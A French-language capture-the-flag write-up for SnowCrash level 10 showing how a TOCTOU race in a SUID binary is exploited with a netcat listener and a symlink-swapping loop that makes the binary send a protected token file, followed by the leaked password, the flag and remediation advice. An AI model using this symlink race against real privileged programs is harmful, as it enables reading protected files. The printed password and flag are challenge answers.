## SnowCrash - Level 10 - Exploitation d'une Race Condition (TOCTOU)

### 1. Analyse de l'environnement

Dans le répertoire personnel, nous trouvons :

* **`level10`** : Un binaire avec le bit **SUID** (propriétaire `flag10`).
* **`token`** : Un fichier appartenant à `flag10` et protégé en lecture.

Le binaire `level10` prend deux arguments : un fichier et une adresse IP. Son rôle est d'envoyer le contenu du fichier vers l'hôte spécifié sur le port **6969**, mais seulement si l'utilisateur a les droits de lecture sur ledit fichier.

### 2. La vulnérabilité : TOCTOU

L'analyse du binaire révèle l'utilisation de la fonction `access()` pour vérifier les permissions, suivie de l'ouverture du fichier pour l'envoi réseau.

C'est une faille de type **TOCTOU** (*Time-of-Check to Time-of-Use*). Il existe un laps de temps infime entre le moment où le programme **vérifie** les droits (Check) et le moment où il **utilise** le fichier (Use). Pendant cet intervalle, un attaquant peut intervertir le fichier validé par un fichier protégé.

### 3. Stratégie d'exploitation

Pour gagner cette "course contre la montre" (Race Condition), nous devons exécuter trois processus simultanément :

1. Un serveur qui écoute les données entrantes.
2. Une boucle qui échange très rapidement un lien symbolique entre un fichier autorisé et le fichier `token`.
3. Une boucle qui tente d'exécuter le binaire en continu.

### 4. Commandes exécutées

#### Étape 1 : Préparation du serveur (Terminal A)

Nous utilisons `nc` (netcat) pour écouter sur le port 6969.

```bash
level10@SnowCrash:~$ nc -lk 6969

```

#### Étape 2 : Création de la Race Condition (Terminal B)

On crée un fichier factice (`/tmp/fake`) sur lequel nous avons les droits, puis on fait boucler la création d'un lien symbolique `/tmp/pwn` qui pointe alternativement vers le leurre et vers la cible.

```bash
level10@SnowCrash:~$ touch /tmp/fake
level10@SnowCrash:~$ while true; do ln -sf /tmp/fake /tmp/pwn; ln -sf /home/user/level10/token /tmp/pwn; done

```

#### Étape 3 : Harcèlement du binaire (Terminal C)

On lance le binaire en boucle en lui donnant le lien symbolique comme argument.

```bash
level10@SnowCrash:~$ while true; do ./level10 /tmp/pwn 127.0.0.1; done

```

### 5. Résultat

Dans le **Terminal A** (celui de `nc`), la bannière du programme s'affiche en boucle. Lorsque le timing est parfait, le contenu du fichier `token` est envoyé juste avant que la connexion ne soit coupée :

```text
.*( )*.
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.

```

### 6. Obtention du Flag

Le mot de passe récupéré permet de se connecter à l'utilisateur `flag10` pour générer le flag final :

```bash
level10@SnowCrash:~$ su flag10
Password: [woupa2yuojeeaaed06riuj63c]
flag10@SnowCrash:~$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c

```

### 7. Conclusion

Ce niveau démontre que la sécurité ne peut pas être garantie si la vérification des droits et l'accès à la ressource ne sont pas **atomiques** (indissociables).

**Sécurisation :**

* Ne pas utiliser `access()`.
* Ouvrir le fichier directement et gérer l'erreur de permission renvoyée par le système.
* Travailler avec des descripteurs de fichiers (`fstat`) plutôt que des chemins de fichiers pour éviter les détournements via liens symboliques.
